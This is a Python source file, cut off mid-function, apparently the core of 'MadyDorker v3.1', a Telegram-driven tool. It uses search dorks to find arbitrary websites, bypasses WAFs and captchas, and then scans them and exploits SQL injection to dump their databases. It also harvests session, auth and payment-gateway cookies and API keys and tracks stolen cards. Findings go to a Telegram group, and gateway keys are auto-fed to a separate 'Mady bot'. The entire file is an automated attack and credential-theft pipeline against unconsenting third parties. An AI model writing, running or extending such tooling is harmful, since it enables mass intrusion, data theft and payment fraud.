"""
MadyDorker v3.1 — Main Pipeline & Telegram Bot

Unified pipeline: Dorker → Scanner → Exploiter → Dumper → Reporter

Improvements v3.1:
  - SQLite persistence (replaces JSON files)
  - Concurrent URL processing (semaphore-based)
  - Smart priority queue (params+CMS+WAF scoring)
  - Per-domain circuit breaker (3 failures → 30min block)
  - Content hash deduplication
  - Soft-404 detection
  - Cookie extraction & collection (b3, session, auth)
  - Engine health tracking + adaptive rate limiting
  - Dork effectiveness scoring
  - WAF-specific bypass payloads
  - Technology-based DBMS selection

Commands:
    /start          — Show help
    /dorkon         — Start full pipeline (24/7 mode)
    /dorkoff        — Stop pipeline
    /status         — Current stats & findings
    /dorkstats      — Detailed dorking statistics
    /sqlistats      — SQL injection statistics
    /secrets        — List found secrets/keys
    /dumps          — List data dumps
    /cookies        — List extracted cookies (b3, session, auth)
    /cookiehunt <url> — Actively hunt URL for B3 + gateway cookies
    /categories     — List available dork categories
    /target <cat>   — Run targeted scan for a category
    /scan <url>     — Scan a single URL
    /mass url1 url2  — Mass scan up to 25 URLs
    /authscan <url> cookies — Authenticated scan behind login walls
    /setgroup        — Set this chat as findings report group
    /export          — Export all findings to .txt now
    /deepscan <url> — Deep scan a URL (crawl + extract + SQLi)
"""

import os
import sys
import json
import re
import random
import asyncio
import hashlib
import signal
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

from loguru import logger

# Configure logging
logger.remove()
logger.add(sys.stderr, level="INFO", format="<green>{time:HH:mm:ss}</green> | <level>{level:<7}</level> | {message}")
logger.add("madydorker.log", rotation="10 MB", retention=3, level="DEBUG")

# Telegram setup
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters
    HAS_PTB = True
except ImportError:
    HAS_PTB = False
    logger.warning("python-telegram-bot not installed, running without Telegram")

# Local imports
from config_v3 import DorkerConfig
from dork_generator import DorkGenerator
from engines import MultiSearch
from waf_detector import WAFDetector, ProtectionInfo
from sqli_scanner import SQLiScanner, SQLiResult
from sqli_dumper import SQLiDumper, DumpedData
from secret_extractor import SecretExtractor, ExtractedSecret
from reporter import TelegramReporter
from persistence import DorkerDB
from captcha_solver import CaptchaSolver, SitekeyExtractor
from proxy_manager import ProxyManager
from browser_engine import BrowserManager, _HAS_PLAYWRIGHT, flaresolverr_crawl, spa_extract, spa_extract_with_flaresolverr, SPAExtractionResult
from cookie_hunter import CookieHunter
from ecommerce_checker import EcommerceChecker
from recursive_crawler import RecursiveCrawler, CrawlPage, CrawlResult, generate_seed_urls
from port_scanner import PortScanner, PortScanResult
from oob_sqli import OOBInjector, OOBResult
from union_dumper import MultiUnionDumper, UnionDumpResult
from key_validator import KeyValidator, KeyValidation
from ml_filter import MLFilter, FilterResult
from js_analyzer import JSBundleAnalyzer, JSAnalysisResult, analyze_js_bundles
from api_bruteforcer import APIBruteforcer, BruteforceResult, bruteforce_api
from mady_feeder import MadyFeeder, MadyFeederConfig, feed_to_mady, get_feeder
from hint_engine import (
    get_cookie_hint, get_secret_hint, get_endpoint_hint,
    get_waf_hint, get_port_hint, get_sqli_hint, get_dump_hint,
    get_contextual_hints, CMS_HINTS, WAF_BYPASS_HINTS
)

# Extended vulnerability scanners (v3.17)
from xss_scanner import XSSScanner, XSSResult
from ssti_scanner import SSTIScanner, SSTIResult
from nosql_scanner import NoSQLScanner, NoSQLResult
from lfi_scanner import LFIScanner, LFIResult
from ssrf_scanner import SSRFScanner, SSRFResult
from cors_scanner import CORSScanner, CORSResult
from redirect_scanner import OpenRedirectScanner, RedirectResult
from crlf_scanner import CRLFScanner, CRLFResult
from auto_dumper import AutoDumper, ParsedDumpData
from dump_parser import DumpParser


class MadyDorkerPipeline:
    """The main v3.1 pipeline: Generate → Search → Detect → Exploit → Dump → Report."""

    def __init__(self, config: DorkerConfig = None):
        self.config = config or DorkerConfig()
        self.running = False
        self._task = None
        self._bot = None
        self._chat_id = None
        
        # Components
        self.generator = DorkGenerator(self.config.params_dir)
        self.searcher = MultiSearch(
            proxies=self._load_proxies(),
            engines=self.config.engines,
            max_pages=self.config.search_max_pages,
        )
        
        # Proxy manager (Phase 2)
        self.proxy_manager = None
        if self.config.use_proxies:
            proxy_files = getattr(self.config, 'proxy_files', [])
            # Legacy fallback: if no proxy_files list, use single proxy_file
            if not proxy_files and self.config.proxy_file:
                proxy_files = [self.config.proxy_file]
            self.proxy_manager = ProxyManager(
                proxy_files=proxy_files,
                strategy=getattr(self.config, 'proxy_rotation_strategy', 'weighted'),
                ban_threshold=getattr(self.config, 'proxy_ban_threshold', 5),
                ban_duration=getattr(self.config, 'proxy_ban_duration', 600),
                country_filter=getattr(self.config, 'proxy_country_filter', []),
                sticky_per_domain=getattr(self.config, 'proxy_sticky_per_domain', 3),
                health_check=getattr(self.config, 'proxy_health_check', True),
                health_check_interval=getattr(self.config, 'proxy_health_interval', 300),
                health_check_timeout=getattr(self.config, 'proxy_health_timeout', 10),
                protocol=getattr(self.config, 'proxy_protocol', 'http'),
                enabled=True,
            )
            self.searcher.proxy_manager = self.proxy_manager
        
        # Configure Firecrawl in search engine
        if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
            self.searcher.firecrawl_api_key = self.config.firecrawl_api_key
            self.searcher.firecrawl_search_limit = self.config.firecrawl_search_limit
            self.searcher.firecrawl_as_fallback = self.config.firecrawl_as_fallback
            if not self.config.firecrawl_as_fallback and "firecrawl" not in self.config.engines:
                self.config.engines.insert(0, "firecrawl")
                self.searcher.engine_names.insert(0, "firecrawl")
            logger.info("🔥 Firecrawl search engine enabled")
        
        # Captcha solver (Phase 1)
        self.captcha_solver = None
        _any_captcha_key = (self.config.captcha_twocaptcha_key or
                           self.config.captcha_nopecha_key or
                           self.config.captcha_anticaptcha_key)
        if self.config.captcha_enabled and _any_captcha_key:
            self.captcha_solver = CaptchaSolver(
                twocaptcha_key=self.config.captcha_twocaptcha_key,
                nopecha_key=self.config.captcha_nopecha_key,
                anticaptcha_key=self.config.captcha_anticaptcha_key,
                provider_order=self.config.captcha_provider_order,
                enabled=self.config.captcha_enabled,
                max_solve_time=float(self.config.captcha_max_solve_time),
                auto_solve_search=self.config.captcha_auto_solve_search,
                auto_solve_target=self.config.captcha_auto_solve_target,
            )
            self.searcher.captcha_solver = self.captcha_solver
            providers = ", ".join(self.captcha_solver.provider_names)
            logger.info(f"🧩 Captcha solver enabled — providers: {providers}")
        
        self.waf_detector = WAFDetector(
            timeout=self.config.waf_timeout,
            max_concurrent=self.config.waf_max_concurrent,
        )
        self.sqli_scanner = SQLiScanner(
            timeout=self.config.sqli_timeout,
            max_concurrent=self.config.sqli_max_concurrent,
            delay=self.config.sqli_delay,
        )
        self.dumper = SQLiDumper(
            scanner=self.sqli_scanner,
            output_dir=self.config.dumper_output_dir,
            max_rows=self.config.dumper_max_rows,
            timeout=self.config.dumper_timeout,
            blind_enabled=self.config.dumper_blind_enabled,
            blind_time_delay=self.config.dumper_blind_delay,
            blind_max_rows=self.config.dumper_blind_max_rows,
        )
        self.secret_extractor = SecretExtractor(
            timeout=self.config.secret_timeout,
            max_concurrent=self.config.secret_max_concurrent,
        )
        self.reporter = TelegramReporter(
            bot_token=self.config.telegram_bot_token,
            chat_id=self.config.telegram_group_id or self.config.telegram_chat_id,
            rate_limit=self.config.reporter_rate_limit,
            batch_size=self.config.reporter_batch_size,
        )
        
        # SQLite persistence
        self.db = DorkerDB(self.config.sqlite_db_path)
        
        # Firecrawl engine instance for scrape/crawl (not just search)
        self._firecrawl_engine = None
        if self.config.firecrawl_enabled and self.config.firecrawl_api_key:
            from engines import FirecrawlSearch
            self._firecrawl_engine = FirecrawlSearch(
                api_key=self.config.firecrawl_api_key,
                search_limit=self.config.firecrawl_search_limit,
            )
        
        # Cookie Hunter (Phase 3 — v3.5)
        self.cookie_hunter = None
        if getattr(self.config, 'cookie_hunter_enabled', True):
            self.cookie_hunter = CookieHunter(
                config=self.config,
                reporter=self.reporter,
                db=self.db,
                proxy_manager=self.proxy_manager,
            )
            logger.info("🍪 Cookie Hunter enabled — hunting B3 + gateway cookies")
        
        # E-commerce checker (Phase 3 — v3.8)
        self.ecom_checker = None
        if getattr(self.config, 'ecom_checker_enabled', True):
            self.ecom_checker = EcommerceChecker(
                config=self.config,
                reporter=self.reporter,
                db=self.db,
                proxy_manager=self.proxy_manager,
            )
            logger.info("🛍️ E-commerce checker enabled — Shopify/WooCommerce/Magento/PrestaShop/OpenCart")

        # Recursive crawler (Phase 3 — v3.9 depth control)
        self.crawler = None
        if getattr(self.config, 'deep_crawl_enabled', True):
            self.crawler = RecursiveCrawler(
                config=self.config,
                proxy_manager=self.proxy_manager,
            )
            logger.info(
                f"🕸️ Recursive crawler enabled — depth={self.config.deep_crawl_max_depth}, "
                f"max_pages={self.config.deep_crawl_max_pages}"
            )

        # Browser engine (Phase 3 — v3.7 search resilience)
        self.browser_manager = None
        if self.config.browser_enabled and _HAS_PLAYWRIGHT:
            self.browser_manager = BrowserManager(
                headless=self.config.browser_headless,
                max_concurrent=self.config.browser_max_concurrent,
                page_timeout=self.config.browser_page_timeout,
            )
            self.searcher.browser_manager = self.browser_manager
            self.searcher.browser_fallback_enabled = True
            self.searcher.browser_engines = self.config.browser_engines
            logger.info("🌐 Headless browser engine enabled (Playwright/Chromium)")
        elif self.config.browser_enabled and not _HAS_PLAYWRIGHT:
            logger.warning("🌐 Browser engine requested but Playwright not installed: pip install playwright && playwright install chromium")
        
        # Port Scanner (Phase 4 — v3.10)
        self.port_scanner = None
        if getattr(self.config, 'port_scan_enabled', True):
            self.port_scanner = PortScanner(
                config=self.config,
                reporter=self.reporter,
                db=self.db,
            )
            logger.info("🔍 Port scanner enabled")
        
        # OOB SQLi Injector (Phase 4 — v3.11)
        self.oob_injector = None
        if getattr(self.config, 'oob_sqli_enabled', False):
            self.oob_injector = OOBInjector(
                config=self.config,
                reporter=self.reporter,
                db=self.db,
            )
            logger.info("📡 OOB SQLi injector enabled")
        
        # Multi-DBMS Union Dumper (Phase 4 — v3.12)
        self.union_dumper = None
        if getattr(self.config, 'union_dump_enabled', True):
            self.union_dumper = MultiUnionDumper(
                config=self.config,
                scanner=self.sqli_scanner,
            )
            logger.info("🗃️ Multi-DBMS union dumper enabled (MySQL/MSSQL/PostgreSQL/Oracle/SQLite)")
        
        # API Key Validator (Phase 4 — v3.13)
        self.key_validator = None
        if getattr(self.config, 'key_validation_enabled', True):
            self.key_validator = KeyValidator(
                config=self.config,
                reporter=self.reporter,
                db=self.db,
            )
            logger.info("🔑 API key validator enabled (16 key types)")
        
        # ML False Positive Filter (Phase 4 — v3.14)
        self.ml_filter = None
        if getattr(self.config, 'ml_filter_enabled', True):
            self.ml_filter = MLFilter(
                config=self.config,
                db=self.db,
            )
            self.ml_filter.bootstrap_training()
            logger.info("🧠 ML false positive filter enabled (gradient boosted trees)")
        
        # Extended Vulnerability Scanners (v3.17)
        self.xss_scanner = XSSScanner(config=self.config) if getattr(self.config, 'xss_enabled', True) else None
        self.ssti_scanner = SSTIScanner(config=self.config) if getattr(self.config, 'ssti_enabled', True) else None
        self.nosql_scanner = NoSQLScanner(config=self.config) if getattr(self.config, 'nosql_enabled', True) else None
        self.lfi_scanner = LFIScanner(config=self.config) if getattr(self.config, 'lfi_enabled', True) else None
        self.ssrf_scanner = SSRFScanner(config=self.config) if getattr(self.config, 'ssrf_enabled', True) else None
        self.cors_scanner = CORSScanner(config=self.config) if getattr(self.config, 'cors_enabled', True) else None
        self.redirect_scanner = OpenRedirectScanner(config=self.config) if getattr(self.config, 'redirect_enabled', True) else None
        self.crlf_scanner = CRLFScanner(config=self.config) if getattr(self.config, 'crlf_enabled', True) else None
        _ext_count = sum(1 for s in [self.xss_scanner, self.ssti_scanner, self.nosql_scanner, self.lfi_scanner, self.ssrf_scanner, self.cors_scanner, self.redirect_scanner, self.crlf_scanner] if s)
        if _ext_count:
            logger.info(f"🎯 Extended vuln scanners enabled: {_ext_count}/8 (XSS/SSTI/NoSQL/LFI/SSRF/CORS/Redirect/CRLF)")
        
        # Auto Dumper — unified dump orchestrator (v3.18)
        self.auto_dumper = None
        if getattr(self.config, 'auto_dump_enabled', True):
            self.auto_dumper = AutoDumper(
                config=self.config,
                dumper=self.dumper,
                union_dumper=self.union_dumper,
                oob_injector=self.oob_injector,
                reporter=self.reporter,
                db=self.db,
                key_validator=self.key_validator,
                secret_extractor=self.secret_extractor,
            )
            self.dump_parser = DumpParser()  # Standalone dump parser for external files
            logger.info("📦 Auto Dumper v1.0 enabled (inject → dump → parse → report pipeline)")
        
        # Mady Bot Feeder — auto-feed gateway keys to Mady bot (v3.21)
        self.mady_feeder = None
        if getattr(self.config, 'mady_bot_feed', True):
            try:
                self.mady_feeder = MadyFeeder(MadyFeederConfig(
                    enabled=True,
                    mady_path=getattr(self.config, 'mady_bot_path', '/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0'),
                ))
                logger.info("🤖 Mady Bot feeder enabled (50+ gateway types)")
            except Exception as e:
                logger.warning(f"Mady Bot feeder init failed: {e}")
        
        # In-memory state (synced to DB)
        self.seen_domains: Set[str] = set()
        self.vulnerable_urls: List[Dict] = []
        self.found_gateways: List[Dict] = []
        self.found_secrets: List[Dict] = []
        self.found_cards: List[Dict] = []
        self.cycle_count = 0
        self.urls_scanned = 0
        self.start_time = None
        
        # Concurrency controls
        self._url_semaphore = asyncio.Semaphore(self.config.concurrent_url_limit)
        
        # Soft-404 fingerprints per domain
        self._soft404_cache: Dict[str, str] = {}
        
        # Content hash dedup (in-memory cache, backed by DB)
        self._content_hashes: Set[str] = set()
        
        # Report group forwarding (set via /setgroup)
        self._report_chat_id: Optional[int] = None
        
        # Hourly export directory
        self._export_dir = os.path.join(os.path.dirname(__file__), "exports")
        os.makedirs(self._export_dir, exist_ok=True)
        self._last_export_time: Optional[datetime] = None
        self._export_counter = 0
        self._hits_since_export = 0
        self._auto_export_threshold = 10  # Auto-export every N hits
        
        # Load previous state
        self._load_state()
    
    def _load_proxies(self) -> List[str]:
        """Load proxies from file."""
        if not self.config.use_proxies:
            return []
        try:
            if os.path.exists(self.config.proxy_file):
                with open(self.config.proxy_file) as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                logger.info(f"Loaded {len(proxies)} proxies")
                return proxies
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
        return []
    
    def _load_state(self):
        """Load previous run state from SQLite (with JSON fallback migration)."""
        # Migrate from old JSON files if they exist and DB is empty
        if self.db.get_seen_domain_count() == 0:
            imported = self.db.import_from_json_files(
                seen_file=self.config.seen_domains_file,
                vuln_file=self.config.vulnerable_urls_file,
                gateway_file=self.config.gateway_keys_file,
            )
            if imported > 0:
                logger.info(f"Migrated {imported} records from JSON to SQLite")
        
        # Load from DB
        self.seen_domains = self.db.get_seen_domains()
        self.vulnerable_urls = self.db.get_vulnerable_urls(limit=1000)
        self.found_gateways = self.db.get_gateway_keys(limit=1000)
        logger.info(f"Loaded state: {len(self.seen_domains)} domains, "
                     f"{len(self.vulnerable_urls)} vulns, {len(self.found_gateways)} gateways")
    
    def _save_state(self):
        """Save current state — mostly handled by DB now, but keep JSON backcompat."""
        try:
            # Also write JSON files for backward compatibility
            with open(self.config.seen_domains_file, "w") as f:
                for domain in self.seen_domains:
                    f.write(domain + "\n")
            
            if self.vulnerable_urls:
                with open(self.config.vulnerable_urls_file, "w") as f:
                    json.dump(self.vulnerable_urls[-500:], f, indent=2)
            
            if self.found_gateways:
                with open(self.config.gateway_keys_file, "w") as f:
                    json.dump(self.found_gateways[-500:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")
    
    def _should_skip_url(self, url: str) -> bool:
        """Check if URL should be skipped."""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            
            for skip in self.config.skip_domains:
                if skip in domain:
                    return True
            
            # Circuit breaker check
            if self.db.is_domain_blocked(domain):
                logger.debug(f"Domain {domain} is circuit-broken, skipping")
                return True
            
            return False
        except:
            return True

    def _content_hash(self, content: str) -> str:
        """Generate hash for content deduplication."""
        # Strip whitespace-only differences
        cleaned = re.sub(r'\s+', ' ', content[:5000]).strip() if content else ""
        return hashlib.md5(cleaned.encode(errors="ignore")).hexdigest()

    def _is_duplicate_content(self, content: str, url: str) -> bool:
        """Check if content is a duplicate (same page served at different URL)."""
        h = self._content_hash(content)
        if h in self._content_hashes:
            return True
        if self.db.is_content_seen(content[:5000]):
            self._content_hashes.add(h)
            return True
        self._content_hashes.add(h)
        self.db.add_content_hash(content[:5000], url)
        return False

    async def _detect_soft_404(self, domain: str, session) -> Optional[str]:
        """Fetch a known-nonexistent page to fingerprint the soft-404 response."""
        if domain in self._soft404_cache:
            return self._soft404_cache[domain]
        
        try:
            fake_path = f"/{''.join(random.choices('abcdefghijklmnop', k=12))}.php"
            test_url = f"https://{domain}{fake_path}"
            
            async with session.get(test_url, allow_redirects=True, ssl=False) as resp:
                body = await resp.text(errors="ignore")
                fingerprint = self._content_hash(body)
                self._soft404_cache[domain] = fingerprint
                self.db.set_soft404_fingerprint(domain, fingerprint)
                return fingerprint
        except Exception:
            return None

    def _is_soft_404(self, content: str, domain: str) -> bool:
        """Check if the content matches the soft-404 fingerprint for this domain."""
        if not self.config.soft404_detection:
            return False
        fingerprint = self._soft404_cache.get(domain) or self.db.get_soft404_fingerprint(domain)
        if not fingerprint:
            return False
        content_hash = self._content_hash(content)
        return content_hash == fingerprint

    def _score_url_priority(self, url: str, waf_info=None) -> int:
        """Score URL for priority queue — higher = process first."""
        score = 50  # Base score
        parsed = urlparse(url)
        
        # Has parameters → higher priority
        if parsed.query:
            params = parsed.query.split("&")
            score += len(params) * 5
            
            # Has high-value params
            for p in params:
                name = p.split("=")[0].lower()
                if name in ("id", "pid", "uid", "cid", "product_id", "item_id", "cat", "category"):
                    score += 15
                elif name in ("search", "q", "query", "keyword"):
                    score += 10
        
        # WAF risk affects priority
        if waf_info:
            risk = waf_info.risk_level if hasattr(waf_info, 'risk_level') else "unknown"
            if risk == "low":
                score += 20
            elif risk == "medium":
                score += 10
            elif risk == "high":
                score -= 10
            elif risk == "extreme":
                score -= 30
            
            # Known CMS → know the DBMS → faster testing
            if hasattr(waf_info, 'cms') and waf_info.cms:
                score += 10
        
        # File extension hints
        path = parsed.path.lower()
        if path.endswith('.php'):
            score += 10
        elif path.endswith(('.asp', '.aspx')):
            score += 8
        elif path.endswith('.jsp'):
            score += 8
        
        return score

    def set_telegram_context(self, bot, chat_id):
        """Store telegram bot and chat for progress messages."""
        self._bot = bot
        self._chat_id = chat_id

    def set_report_group(self, chat_id: int):
        """Set a group/channel to receive all findings."""
        self._report_chat_id = chat_id
        logger.info(f"Report group set: {chat_id}")

    async def _send_to_report_group(self, text: str):
        """Forward a finding to the dedicated report group."""
        if self._bot and self._report_chat_id:
            try:
                await self._bot.send_message(
                    chat_id=self._report_chat_id,
                    text=text,
                    parse_mode="HTML",
                )
            except Exception as e:
                logger.debug(f"Report group send failed: {e}")

    async def _send_progress(self, text: str):
        """Send a progress update to the user's chat."""
        if self._bot and self._chat_id:
            try:
                await self._bot.send_message(
                    chat_id=self._chat_id,
                    text=text,
                    parse_mode="HTML",
                )
            except Exception as e:
                logger.error(f"Progress send failed: {e}")
        # Also forward findings (HIT / vuln / secret / dump) to report group
        if self._report_chat_id and self._report_chat_id != self._chat_id:
            keywords = ("HIT", "SQLi", "vuln", "secret", "dump", "card", "gateway",
                        "B3", "injectable", "CRITICAL", "FlareSolverr got", "GCP",
                        "Twilio", "AWS", "Stripe", "API Key")
            if any(kw.lower() in text.lower() for kw in keywords):
                await self._send_to_report_group(text)

    async def process_url(self, url: str) -> Dict:
        """Process a single URL through the full pipeline.
        
        Steps:
        1. Soft-404 detection
        2. Content deduplication
        3. WAF Detection
        4. Cookie extraction (b3, session, auth)
        5. Secret Extraction  
        6. SQLi Testing (URL params + cookies + headers + POST)
        7. Data Dumping (if injectable)
        8. Report findings
        
        Returns:
            Dict with all findings
        """
        result = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "waf": None,
            "secrets": [],
            "sqli": [],
            "dumps": [],
            "cookies": {},
            "ports": [],
            "oob": [],
            "key_validations": [],
            "xss": [],
            "ssti": [],
            "nosql": [],
            "lfi": [],
            "ssrf": [],
            "cors": [],
            "redirects": [],
            "crlf": [],
            "js_analysis": None,
            "api_bruteforce": None,
            "mady_fed": 0,
        }
        
        domain = urlparse(url).netloc
        self.seen_domains.add(domain)
        self.db.add_seen_domain(domain)
        self.urls_scanned += 1
        self.reporter.stats.urls_scanned += 1
        
        import aiohttp
        timeout = aiohttp.ClientTimeout(total=self.config.validation_timeout)
        
        try:
            async with self._url_semaphore:
                async with aiohttp.ClientSession(timeout=timeout, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }) as session:
                    
                    # Step 0: Soft-404 detection
                    if self.config.soft404_detection:
                        try:
                            await self._detect_soft_404(domain, session)
                        except Exception as e:
                            logger.debug(f"Soft-404 detection failed for {domain}: {e}")
                    
                    # Step 1: WAF Detection
                    waf_info = None
                    waf_name = None
                    if self.config.waf_detection_enabled:
                        try:
                            waf_info = await self.waf_detector.detect(url, session)
                            waf_name = waf_info.waf
                            result["waf"] = {
                                "name": waf_info.waf,
                                "cdn": waf_info.cdn,
                                "bot_protection": waf_info.bot_protection,
                                "risk": waf_info.risk_level,
                                "cms": waf_info.cms,
                            }
                            
                            # Skip if too protected (unless captcha can be solved)
                            should_skip = False
                            if self.config.waf_skip_extreme and waf_info.risk_level == "extreme":
                                should_skip = True
                            if self.config.waf_skip_high and waf_info.risk_level == "high":
                                should_skip = True
                            
                            # Attempt captcha solving if bot protection detected
                            if waf_info.bot_protection and self.captcha_solver and self.captcha_solver.auto_solve_target:
                                from captcha_solver import SitekeyExtractor
                                captcha_type = SitekeyExtractor.detect_type_from_name(waf_info.bot_protection)
                                if captcha_type:
                                    logger.info(f"Bot protection ({waf_info.bot_protection}) on {url} — attempting captcha solve")
                                    # Fetch page HTML for sitekey extraction
                                    try:
                                        async with session.get(url, ssl=False) as captcha_resp:
                                            captcha_html = await captcha_resp.text()
                                        solve_result = await self.captcha_solver.solve_from_html(captcha_html, url)
                                        if solve_result.success:
                                            logger.info(f"Captcha solved for {url} via {solve_result.provider} — proceeding")
                                            should_skip = False  # Override skip, we solved the captcha
                                    except Exception as e:
                                        logger.debug(f"Captcha solve attempt failed for {url}: {e}")
                            
                            if should_skip:
                                logger.info(f"Skipping {url} — {waf_info.risk_level} protection ({waf_info.waf or waf_info.bot_protection})")
                                return result
                        except Exception as e:
                            logger.debug(f"WAF detection failed for {url}: {e}")
                    
                    # Step 1b: Port Scanning (v3.10)
                    if self.port_scanner:
                        try:
                            port_result = await self.port_scanner.scan_and_report(url)
                            if port_result and port_result.open_ports:
                                result["ports"] = [
                                    {"port": p.port, "service": p.service, "banner": p.banner,
                                     "version": p.version, "risk": p.risk}
                                    for p in port_result.open_ports
                                ]
                        except Exception as e:
                            logger.debug(f"Port scan failed: {e}")
                    
                    # Step 2: Cookie Extraction
                    if self.config.cookie_extraction_enabled:
                        try:
                            jar = await self.sqli_scanner.extract_cookies(url, session)
                            if jar.cookies:
                                result["cookies"] = {
                                    "all": jar.cookies,
                                    "session": jar.session_cookies,
                                    "auth": jar.auth_cookies,
                                    "b3": jar.b3_cookies,
                                }
                                # Store in DB
                                for name, value in jar.cookies.items():
                                    cookie_type = "session" if any(name in sc for sc in jar.session_cookies) else \
                                                  "auth" if any(name in ac for ac in jar.auth_cookies) else "other"
                                    self.db.add_cookie(url, name, value, cookie_type)
                                
                                # Store b3 cookies specifically
                                for name, value in jar.b3_cookies.items():
                                    self.db.add_b3_cookie(url, name, value)
                                    
                                if jar.b3_cookies:
                                    logger.info(f"🔵 B3 cookies found at {url}: {list(jar.b3_cookies.keys())}")
                        except Exception as e:
                            logger.debug(f"Cookie extraction failed: {e}")
                    
                    # Step 2b: Cookie Hunter — active B3 + gateway probing
                    if self.cookie_hunter:
                        try:
                            hunt_result = await self.cookie_hunter.hunt_and_report(url, session)
                            if hunt_result.total_finds > 0:
                                result["cookie_hunt"] = {
                                    "b3": [{"name": f.cookie_name, "value": f.cookie_value, "source": f.source}
                                           for f in hunt_result.b3_finds],
                                    "gateway": [{"name": f.cookie_name, "value": f.cookie_value,
                                                 "gateway": f.gateway, "source": f.source}
                                                for f in hunt_result.gateway_finds],
                                    "commerce": [{"name": f.cookie_name, "value": f.cookie_value}
                                                 for f in hunt_result.commerce_finds],
                                    "detected_gateways": hunt_result.detected_gateways,
                                }
                                # Update reporter stats
                                self.reporter.stats.b3_cookies_found += len(hunt_result.b3_finds)
                                self.reporter.stats.gateway_cookies_found += len(hunt_result.gateway_finds)
                                self.reporter.stats.commerce_cookies_found += len(hunt_result.commerce_finds)
                        except Exception as e:
                            logger.debug(f"Cookie hunter failed: {e}")
                    
                    # Step 2c: E-commerce platform check (Shopify/WooCommerce/Magento)
                    if self.ecom_checker:
                        try:
                            ecom_result = await self.ecom_checker.check_and_report(url, session)
                            if ecom_result.total_findings > 0:
                                result["ecommerce"] = {
                                    "platform": ecom_result.primary_platform.name if ecom_result.primary_platform else None,
                                    "confidence": ecom_result.primary_platform.confidence if ecom_result.primary_platform else 0,
                                    "findings": len(ecom_result.findings),
                                    "gateways": [gf.data.get("gateway", "") for gf in ecom_result.gateway_plugins],
                                    "secrets": len(ecom_result.secrets_found),
                                }
                        except Exception as e:
                            logger.debug(f"E-commerce check failed: {e}")

                    # Step 3: Recursive Crawl + Secret Extraction
                    # BFS crawl discovers pages → extract secrets from each page in real time
                    crawl_result = None
                    discovered_param_urls: Set[str] = set()
                    
                    if self.config.secret_extraction_enabled:
                        secrets: list = []
                        
                        if self.crawler and self.config.deep_crawl_enabled:
                            # --- v3.9 Recursive Crawler ---
                            async def _on_crawl_page(page: CrawlPage):
                                """Real-time secret extraction as pages are crawled."""
                                if page.html:
                                    page_secrets = self.secret_extractor.extract_from_text(
                                        page.html, page.url,
                                    )
                                    if page_secrets:
                                        secrets.extend(page_secrets)
                            
                            crawl_result = await self.crawler.quick_crawl(
                                url,
                                session=session,
                                max_depth=min(self.config.deep_crawl_max_depth, 2),
                                max_pages=min(self.config.deep_crawl_max_pages, 30),
                                on_page=_on_crawl_page,
                            )
                            
                            # ── FlareSolverr fallback: if aiohttp got very few pages ──
                            if crawl_result.total_fetched <= 2:
                                logger.info(
                                    f"[FlareFallback] aiohttp only got {crawl_result.total_fetched} pages "
                                    f"for {url}, trying FlareSolverr crawl..."
                                )
                                try:
                                    flare_result = await flaresolverr_crawl(
                                        seed_url=url,
                                        max_pages=min(self.config.deep_crawl_max_pages, 30),
                                        max_depth=min(self.config.deep_crawl_max_depth, 2),
                                    )
                                    if flare_result.total_fetched > crawl_result.total_fetched:
                                        logger.info(
                                            f"[FlareFallback] FlareSolverr got {flare_result.total_fetched} pages "
                                            f"(vs aiohttp {crawl_result.total_fetched}), using FlareSolverr result"
                                        )
                                        # Run secret extraction on FlareSolverr-crawled pages
                                        for bp in flare_result.html_pages:
                                            if bp.html:
                                                page_secrets = self.secret_extractor.extract_from_text(
                                                    bp.html, bp.url,
                                                )
                                                if page_secrets:
                                                    secrets.extend(page_secrets)
                                        crawl_result = flare_result
                                    else:
                                        logger.info("[FlareFallback] No improvement, keeping aiohttp result")
                                except Exception as e:
                                    logger.warning(f"[FlareFallback] FlareSolverr crawl failed: {e}")
                            
                            discovered_param_urls = crawl_result.param_urls
                            
                            # Store crawl cookies
                            for cname, cval in crawl_result.all_cookies.items():
                                if cname not in result.get("cookies", {}).get("all", {}):
                                    self.db.add_cookie(url, cname, cval, "crawl")
                            for cname, cval in crawl_result.b3_cookies.items():
                                self.db.add_b3_cookie(url, cname, cval)
                                logger.info(f"🔵 B3 cookie via crawl: {cname} at {url}")
                            
                            result["crawl"] = {
                                "pages_fetched": crawl_result.total_fetched,
                                "max_depth": crawl_result.max_depth_reached,
                                "urls_discovered": len(crawl_result.all_urls),
                                "param_urls": len(crawl_result.param_urls),
                                "forms": len(crawl_result.form_targets),
                                "cookies": len(crawl_result.all_cookies),
                                "b3_cookies": len(crawl_result.b3_cookies),
                            }
                        else:
                            # --- Fallback: flat deep_extract_site ---
                            scan_data = await self.secret_extractor.deep_extract_site(url, session)
                            secrets = scan_data.get("secrets", []) if isinstance(scan_data, dict) else scan_data
                        
                        if secrets:
                            result["secrets"] = [
                                {"type": s.type, "name": s.key_name, "value": s.value, "category": s.category}
                                for s in secrets
                            ]
                            
                            # Report each secret
                            for secret in secrets:
                                if secret.category == "gateway":
                                    self.found_gateways.append({
                                        "url": url,
                                        "type": secret.type,
                                        "value": secret.value,
                                        "time": datetime.now().isoformat(),
                                    })
                                    self.db.add_gateway_key(
                                        url, secret.type, secret.value,
                                        source="secret_extraction",
                                        confidence=secret.confidence,
                                    )
                                    await self.reporter.report_gateway(
                                        url, secret.type, secret.value,
                                        {"confidence": secret.confidence}
                                    )
                                    # Auto-feed to Mady bot
                                    if self.mady_feeder:
                                        try:
                                            fed = self.mady_feeder.feed_gateway(
                                                url, secret.type, secret.value,
                                                extra={"confidence": secret.confidence, "source": "secret_extraction"},
                                            )
                                            if fed:
                                                result["mady_fed"] = result.get("mady_fed", 0) + 1
                                                logger.info(f"🤖 Fed gateway to Mady: {secret.type} from {url[:50]}")
                                        except Exception as e:
                                            logger.debug(f"Mady feed failed: {e}")
                                else:
                                    self.found_secrets.append({
                                        "url": url,
                                        "type": secret.type,
